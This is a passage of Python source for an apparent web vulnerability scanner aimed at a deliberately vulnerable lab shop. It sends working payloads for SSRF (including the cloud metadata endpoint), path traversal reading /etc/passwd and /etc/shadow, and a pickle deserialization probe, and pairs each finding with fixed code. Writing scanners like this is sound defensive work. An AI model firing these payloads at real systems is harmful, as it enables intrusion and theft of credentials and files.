# ══════════════════════════════════════════════════════════════════

class AdvancedScanner:

    def __init__(self, base_url, session, creds):
        self.base  = base_url
        self.s     = session
        self.creds = creds

    def scan_ssrf(self):
        print("[SSRF] Testing Server-Side Request Forgery...")
        payloads = [
            ('http://169.254.169.254/latest/meta-data/', 'AWS metadata endpoint'),
            ('http://localhost:5432/',                   'PostgreSQL internal port'),
            ('http://redis:6379/',                       'Redis internal service'),
            ('http://127.0.0.1/debug/',                  'Localhost debug endpoint'),
            ('file:///etc/passwd',                       'File protocol LFI'),
        ]
        for url, desc in payloads:
            try:
                r = self.s.post(urljoin(self.base, '/webhook/test/'),
                                data={'url': url}, timeout=10)
                # Any response with content suggests SSRF
                if r.status_code == 200 and len(r.text) > 20 and 'Error' not in r.text:
                    add_finding(Finding(
                        vuln_id='SSRF-001', severity='CRITICAL',
                        category='SSRF',
                        title='Server-Side Request Forgery (SSRF)',
                        description=f'Server fetches arbitrary URLs from user input. Attacker accessed: {desc}. Can reach AWS metadata, internal services, and read local files.',
                        endpoint='POST /webhook/test/',
                        method='POST', payload=f'url={url}',
                        evidence=f'Response content ({len(r.text)} bytes): {r.text[:200]}',
                        cvss_score=9.8,
                        cve='CWE-918',
                        fix='Whitelist allowed domains. Block private IP ranges.',
                        fix_code='''# ✅ FIXED
import ipaddress, socket
from urllib.parse import urlparse

ALLOWED_DOMAINS = ['webhook.site', 'requestbin.com']

def validate_url(url):
    parsed = urlparse(url)
    if parsed.scheme not in ('http', 'https'):
        raise ValueError("Only HTTP/S allowed")
    if parsed.hostname not in ALLOWED_DOMAINS:
        raise ValueError("Domain not whitelisted")
    # Block private IPs
    try:
        ip = socket.gethostbyname(parsed.hostname)
        if ipaddress.ip_address(ip).is_private:
            raise ValueError("Private IPs not allowed")
    except socket.gaierror:
        raise ValueError("DNS resolution failed")''',
                        references=['https://owasp.org/www-community/attacks/Server_Side_Request_Forgery', 'CWE-918'],
                    ))
                    break
            except Exception:
                pass

    def scan_path_traversal(self):
        print("[PATH] Testing Path Traversal...")
        payloads = [
            '../../../../etc/passwd',
            '../../../../etc/shadow',
            '../vulnshop/settings.py',
            '..%2F..%2F..%2F..%2Fetc%2Fpasswd',
            '....//....//....//etc/passwd',
        ]
        for payload in payloads:
            try:
                r = self.s.get(urljoin(self.base, '/download/'),
                               params={'file': payload}, timeout=8)
                if r.status_code == 200 and ('root:' in r.text or 'SECRET_KEY' in r.text):
                    add_finding(Finding(
                        vuln_id='PATH-001', severity='CRITICAL',
                        category='Path Traversal',
                        title='Path Traversal — Arbitrary File Read',
                        description='File download endpoint allows traversal outside media directory. Attacker can read /etc/passwd, /etc/shadow, Django settings with API keys.',
                        endpoint='GET /download/',
                        method='GET', payload=f'file={payload}',
                        evidence=f'File content leaked. Snippet: {r.text[:150]}',
                        cvss_score=9.1,
                        cve='CVE-2021-41773',
                        fix='Resolve full path and verify it starts with allowed directory.',
                        fix_code='''# ❌ VULNERABLE
file_path = Path(settings.MEDIA_ROOT) / filename  # traversal possible

# ✅ FIXED
from pathlib import Path

def download_file(request):
    filename = request.GET.get('file', '')
    safe_dir = Path(settings.MEDIA_ROOT).resolve()
    target   = (safe_dir / filename).resolve()
    # Critical: check resolved path is within safe_dir
    if not str(target).startswith(str(safe_dir)):
        return HttpResponse('Forbidden', status=403)
    if not target.exists():
        return HttpResponse('Not found', status=404)
    return FileResponse(open(target, 'rb'))''',
                        references=['https://owasp.org/www-community/attacks/Path_Traversal', 'CWE-22'],
                    ))
                    break
            except Exception:
                pass

    def scan_deserialization(self):
        print("[DESER] Testing Insecure Deserialization...")
        import pickle, os, struct

        class SafeProbe:
            """Non-destructive probe — just reads /tmp/test"""
            def __reduce__(self):
                return (os.getenv, ('HOME',))

        try:
            payload = base64.b64encode(pickle.dumps(SafeProbe())).decode()
            r = self.s.post(urljoin(self.base, '/prefs/load/'),
                            data={'prefs': payload}, timeout=8)
            if r.status_code == 200 and ('prefs' in r.text or '/root' in r.text or '/home' in r.text):
                add_finding(Finding(
                    vuln_id='DESER-001', severity='CRITICAL',
                    category='Deserialization',
                    title='Insecure Deserialization (pickle RCE)',
                    description='Server deserializes user-supplied pickle data. Attacker can craft malicious pickle payload for arbitrary code execution with web server privileges.',
                    endpoint='POST /prefs/load/',
                    method='POST', payload=f'prefs=<base64-pickle-payload>',
                    evidence=f'Safe probe executed. Response: {r.text[:150]}. Full RCE possible with malicious __reduce__.',
                    cvss_score=10.0,
                    cve='CWE-502',
                    fix='Never deserialize pickle from untrusted input. Use JSON.',
                    fix_code='''# ❌ VULNERABLE — arbitrary code execution
prefs = pickle.loads(base64.b64decode(user_data))

# ✅ FIXED — use JSON only
import json
try:
    prefs = json.loads(base64.b64decode(user_data).decode())
    # Validate schema
    assert isinstance(prefs, dict)
    assert all(k in ALLOWED_PREF_KEYS for k in prefs)
except (json.JSONDecodeError, AssertionError, UnicodeDecodeError):
    return JsonResponse({'error': 'Invalid preferences'}, status=400)''',
                    references=['https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data', 'CWE-502'],
                ))
        except Exception:
            pass


# ══════════════════════════════════════════════════════════════════
# MODULE 6 — SENSITIVE DATA EXPOSURE
# ══════════════════════════════════════════════════════════════════

class DataExposureScanner:

    def __init__(self, base_url, session, creds):
        self.base  = base_url
        self.s     = session
        self.creds = creds

    def scan_all(self):
        print("[DATA] Testing sensitive data exposure...")

        # Test 1: Unauthenticated user export
        try:
            r = self.s.get(urljoin(self.base, '/export/users/'))
            if r.status_code == 200:
                data = r.json() if r.headers.get('content-type','').startswith('application/json') else []
                if isinstance(data, list) and len(data) > 0:
                    has_password = any('password' in str(u) for u in data)
                    add_finding(Finding(
                        vuln_id='DATA-001', severity='CRITICAL',
                        category='Sensitive Data Exposure',
                        title='Unauthenticated Mass User Export with Password Hashes',
                        description=f'Endpoint dumps all {len(data)} users with email, password hashes, PII. No authentication required. Enables offline hash cracking.',
                        endpoint='GET /export/users/',
                        method='GET', payload='(none)',
                        evidence=f'{len(data)} users returned. Password hashes included: {has_password}. Sample: {str(data[0])[:150]}',
                        cvss_score=9.9,
                        cve='CWE-359',
                        fix='Require superuser auth, remove password from export, add audit logging.',
                        fix_code='''# ❌ VULNERABLE
def export_users(request):  # no auth, all fields
    users = list(User.objects.values())  # includes password hash

# ✅ FIXED
@login_required
def export_users(request):
    if not request.user.is_superuser:
        return HttpResponse(status=403)
    # Log access
    AuditLog.objects.create(user=request.user, action='user_export')
    # Exclude sensitive fields
    users = list(User.objects.values('id','username','email','date_joined'))
    return JsonResponse(users, safe=False)''',
                        references=['CWE-359', 'https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure'],
                    ))
        except Exception:
            pass

        # Test 2: GraphQL introspection
        try:
            r = self.s.post(urljoin(self.base, '/graphql/'),
                            json={'query': '{ __schema { types { name fields { name } } } }'},
                            headers={'Content-Type': 'application/json'})
            if r.status_code == 200 and '__schema' in r.text:
                add_finding(Finding(
                    vuln_id='DATA-002', severity='HIGH',
                    category='Sensitive Data Exposure',
                    title='GraphQL Introspection Enabled — Schema with Payment Fields Exposed',
                    description='GraphQL introspection exposes full schema including Payment model with card_number, card_cvv fields. Assists attacker in crafting targeted queries.',
                    endpoint='POST /graphql/',
                    method='POST', payload='{"query":"{__schema{types{name fields{name}}}}"}',
                    evidence=f'Schema returned including: Payment.card_number, Payment.card_cvv',
                    cvss_score=5.3,
                    cve='CWE-200',
                    fix='Disable introspection in production.',
                    fix_code='''# graphene-django settings.py
GRAPHENE = {
    'SCHEMA': 'app.schema.schema',
    'MIDDLEWARE': ['graphql_jwt.middleware.JSONWebTokenMiddleware'],
}

# Disable introspection in production:
if not DEBUG:
    from graphene_django.views import GraphQLView
    GraphQLView.graphiql = False
    # Use graphene-django-extras to disable introspection''',
                    references=['https://www.apollographql.com/blog/graphql/security/why-you-should-disable-graphql-introspection-in-production/'],
                ))
        except Exception:
            pass

        # Test 3: Security headers check
        try:
            r = self.s.get(self.base)
            headers = r.headers
            missing = []
            required = {
                'X-Content-Type-Options': 'nosniff',
                'X-Frame-Options': 'SAMEORIGIN',
                'Strict-Transport-Security': None,
                'Content-Security-Policy': None,
                'X-XSS-Protection': '1; mode=block',
                'Referrer-Policy': None,
                'Permissions-Policy': None,
            }
            for hdr, expected in required.items():
                if hdr not in headers:
                    missing.append(hdr)
                elif expected and headers[hdr] != expected:
                    missing.append(f'{hdr} (wrong value: {headers[hdr]})')

            if missing:
                add_finding(Finding(
                    vuln_id='DATA-003', severity='MEDIUM',
                    category='Security Misconfiguration',
                    title=f'Missing Security Headers ({len(missing)} headers)',
                    description=f'The following security headers are absent: {", ".join(missing)}. Enables XSS, clickjacking, MIME sniffing, and other client-side attacks.',
                    endpoint='GET /',
                    method='GET', payload='N/A',
                    evidence=f'Missing: {", ".join(missing)}',
                    cvss_score=5.4,
                    cve='CWE-693',
                    fix='Add all security headers via Django settings and middleware.',
                    fix_code='''# settings.py
SECURE_BROWSER_XSS_FILTER      = True
SECURE_CONTENT_TYPE_NOSNIFF    = True
SECURE_HSTS_SECONDS            = 31536000
SECURE_HSTS_INCLUDE_SUBDOMAINS = True
SECURE_HSTS_PRELOAD            = True
SECURE_SSL_REDIRECT            = True
X_FRAME_OPTIONS                = 'SAMEORIGIN'

# CSP via django-csp
# pip install django-csp
CSP_DEFAULT_SRC = ("'self'",)
CSP_SCRIPT_SRC  = ("'self'", 'https://cdn.jsdelivr.net')''',
                    references=['https://securityheaders.com/', 'CWE-693'],
                ))
        except Exception:
            pass


# ══════════════════════════════════════════════════════════════════
# MODULE 7 — API SECURITY
# ══════════════════════════════════════════════════════════════════

class APISecurityScanner:

    def __init__(self, base_url, session, creds):
        self.base  = base_url
        self.s     = session
        self.creds = creds

    def scan_all(self):
        print("[API] Testing API security...")

        # Mass data exposure
        try:
            r = self.s.get(urljoin(self.base, '/api/products/'))
            if r.status_code == 200:
                data = r.json()
                if isinstance(data, list) and len(data) > 0:
                    has_cost = any('cost_price' in str(p) for p in data)
                    if has_cost:
                        add_finding(Finding(
                            vuln_id='API-001', severity='HIGH',
                            category='API Security',
                            title='API Mass Data Exposure — Internal Cost Price Leaked',
                            description=f'Product API returns all {len(data)} products with no pagination and includes internal cost_price field. Competitor can extract complete pricing strategy.',
                            endpoint='GET /api/products/',
                            method='GET', payload='N/A',
                            evidence=f'cost_price field present. Example: {str(data[0])[:150]}',
                            cvss_score=6.5,
                            cve='CWE-213',
                            fix='Use explicit serializer field list. Never expose internal fields. Add pagination.',
                            fix_code='''# ❌ VULNERABLE
products = list(Product.objects.values())  # all fields, no limit

# ✅ FIXED — DRF serializer with whitelist
class ProductSerializer(serializers.ModelSerializer):
    class Meta:
        model = Product
        fields = ['id','name','slug','price','stock','image']  # explicit list
        # cost_price, vendor NOT included

# Paginated view
class ProductListView(generics.ListAPIView):
    queryset = Product.objects.filter(is_active=True)
    serializer_class = ProductSerializer
    pagination_class = CursorPagination  # cursor pagination for large sets''',
                            references=['https://owasp.org/www-project-api-security/', 'API3:2023'],
                        ))
        except Exception:
            pass

        # No rate limiting on API
        try:
            start = time.time()
            results = []
            for _ in range(20):
                r = self.s.get(urljoin(self.base, '/api/products/'))
                results.append(r.status_code)
            all_ok = all(s == 200 for s in results)
            elapsed = time.time() - start
            if all_ok:
                add_finding(Finding(
                    vuln_id='API-002', severity='HIGH',
                    category='API Security',
                    title='No API Rate Limiting — Enumeration & DoS Possible',
                    description=f'20 consecutive API requests completed in {elapsed:.1f}s with no throttling. Attacker can scrape all data, enumerate IDs, or DoS the server.',
                    endpoint='GET /api/products/',
                    method='GET', payload='(rapid repeated requests)',
                    evidence=f'20 requests in {elapsed:.1f}s. All returned 200. No 429 observed.',
                    cvss_score=7.5,
                    cve='CWE-770',
                    fix='Implement DRF throttling + Redis-backed rate limiting.',
                    fix_code='''# settings.py
REST_FRAMEWORK = {
    'DEFAULT_THROTTLE_CLASSES': [
        'rest_framework.throttling.AnonRateThrottle',
        'rest_framework.throttling.UserRateThrottle',
    ],
    'DEFAULT_THROTTLE_RATES': {
        'anon': '60/hour',
        'user': '1000/hour',
    }
}

# For custom limits on specific views:
class ProductListView(generics.ListAPIView):
    throttle_classes = [UserRateThrottle]
    throttle_scope   = 'products'  # 100/hour custom scope''',
                    references=['https://owasp.org/www-project-api-security/', 'API4:2023'],
                ))
        except Exception:
            pass


# ══════════════════════════════════════════════════════════════════
# ORCHESTRATOR
# ══════════════════════════════════════════════════════════════════

class VulnShopScanner:

    def __init__(self, target: str):
        self.target = target.rstrip('/')
        self.s      = requests.Session()
        self.s.verify = False
        self.s.timeout = 12
        self.creds  = {'username': 'alice', 'password': 'password123'}

    def wait_for_target(self):
        print(f"⏳ Waiting for {self.target} to be ready...")
        for i in range(30):
            try:
                r = self.s.get(self.target, timeout=5)
                if r.status_code < 500:
                    print("✅ Target is up!\n")
                    return True
            except Exception:
                pass
            time.sleep(3)
        print("❌ Target not reachable after 90 seconds")
        return False

    def run(self):
        print("=" * 70)
        print("  CyberSentinel Enterprise Scanner v2.0")
        print(f"  Target: {self.target}")
        print(f"  Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("=" * 70)

        if not self.wait_for_target():
            return []

        modules = [
            ("Injection Attacks",     InjectionScanner(self.target, self.s, self.creds),
             ['scan_sqli', 'scan_cmdi', 'scan_xss', 'scan_ssti', 'scan_xxe']),
            ("Authentication",        AuthScanner(self.target, self.s, self.creds),
             ['scan_brute_force', 'scan_session_issues', 'scan_csrf', 'scan_jwt']),
            ("Access Control",        AccessControlScanner(self.target, self.s, self.creds),
             ['scan_idor', 'scan_privilege_escalation']),
            ("Business Logic",        BusinessLogicScanner(self.target, self.s, self.creds),
             ['scan_all']),
            ("Advanced Attacks",      AdvancedScanner(self.target, self.s, self.creds),
             ['scan_ssrf', 'scan_path_traversal', 'scan_deserialization']),
            ("Sensitive Data",        DataExposureScanner(self.target, self.s, self.creds),
             ['scan_all']),
            ("API Security",          APISecurityScanner(self.target, self.s, self.creds),
             ['scan_all']),
        ]

        for module_name, scanner, methods in modules:
            print(f"\n{'─'*60}")
            print(f"  MODULE: {module_name}")
            print(f"{'─'*60}")
            for method_name in methods:
                try:
                    getattr(scanner, method_name)()
                except Exception as e:
                    print(f"  ⚠️  {method_name} error: {e}")

        return findings


if __name__ == '__main__':
    import os
    target = os.environ.get('TARGET_URL', 'http://web:8000')
    scanner = VulnShopScanner(target)
    results = scanner.run()
    print(f"\n\n{'═'*70}")
    print(f"  SCAN COMPLETE — {len(results)} vulnerabilities found")
    print(f"{'═'*70}")